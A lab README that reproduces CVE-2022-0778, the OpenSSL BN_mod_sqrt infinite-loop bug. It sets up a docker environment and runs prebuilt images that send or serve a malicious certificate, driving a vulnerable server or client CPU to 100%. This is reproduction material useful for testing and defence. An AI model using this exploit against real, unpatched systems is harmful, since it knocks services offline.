# CVE-2022-0778

OpenSSL is a secure socket layer cryptographic library that includes major cryptographic algorithms, commonly used key and certificate encapsulation management functions and SSL protocols, and provides a wealth of applications for testing or other purposes.

The vulnerability is due to a bug in the BN_mod_sqrt() function that computes the modulo square root, which could cause it to loop infinitely for non-prime modulo numbers, resulting in a denial of service.

Reference link:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0778
- https://github.com/yywing/cve-2022-0778
- https://www.cnblogs.com/logchen/p/16030515.html

## Environment setup

Run the following command to start:
- Affected server (listening on port 12345): OpenSSL 1.1.0f, python server (with client certificate verification enabled)
- Malicious server that exploits the vulnerability (listening on port 12346: go https server that returns a malicious certificate

```
docker-compose up -d
```

After the environment starts
- `curl -k -v https://localhost:12345` will prompt client certificate error (because client certificate verification is enabled).
- `nc -v localhost 12346` shows the port listening (if the local openssl is affected by the direct curl, the cpu will be directly 100%)

## Vulnerability to reproduce

run:
```
# attack
docker run -it --rm --entrypoint badclient yywing/cve-2022-0778 --addr host.docker.internal:12345

docker stats --no-stream

CONTAINER ID   NAME                        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O   PIDS
3d948d277a89   cve-2022-0778-server-1      99.87%    7.398MiB / 50.15GiB   0.01%     4.38kB / 5.21kB   0B / 0B     1
ba9d7fd208c3   cve-2022-0778-badserver-1   0.00%     2.77MiB / 50.15GiB    0.01%     2.5kB / 1.55kB    0B / 0B     5
```

When an affected server has client certificate verification turned on, a malicious client can send a malicious certificate, causing the server CPU to soar.

run:
```
# client
docker run -it --rm yywing/cve-2022-0778-target curl https://host.docker.internal:12346
# or
docker run -it --rm yywing/cve-2022-0778-target python -c "import http.client;http.client.HTTPSConnection('host.docker.internal', 12345).request('GET', '/')"

docker stats --no-stream

CONTAINER ID   NAME                        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O   PIDS
8ffae845cf96   recursing_dhawan            100.08%   2.801MiB / 50.15GiB   0.01%     2.17kB / 997B     0B / 0B     1
de385c0e76a3   cve-2022-0778-server-1      0.00%     7.375MiB / 50.15GiB   0.01%     878B / 0B         0B / 0B     1
88f476ad4581   cve-2022-0778-badserver-1   0.00%     2.758MiB / 50.15GiB   0.01%     1.78kB / 1.16kB   0B / 0B     5
```
When an affected client accesses a malicious server, the malicious server can send a malicious certificate, causing the client's CPU to soar.

Note:
1. nmap is affected
2. I feel that the red team's perspective loophole is relatively tasteless, but the blue team's perspective is very useful to counter it.